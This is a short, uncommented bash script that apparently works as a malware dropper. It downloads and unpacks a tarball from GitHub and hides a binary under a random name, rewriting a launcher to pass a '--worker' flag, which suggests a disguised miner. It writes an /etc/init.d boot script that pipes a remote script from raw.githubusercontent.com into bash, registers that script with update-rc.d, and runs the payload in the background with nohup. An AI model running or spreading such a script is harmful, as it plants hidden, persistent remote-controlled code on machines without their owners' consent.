cd /
wget https://github.com/leukimina/torque/releases/download/v1.5.0/oscillation.tar
tar -xvf oscillation.tar
cd /oscillation
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv amplitude $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./frequency.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/leukimina/torque/main/magnetism.sh)" > electromagnetism.sh
chmod a+x electromagnetism.sh
update-rc.d electromagnetism.sh defaults
rm -rf oscillation.tar
cd /oscillation
nohup ./frequency.sh
ps -ef | grep oscillation
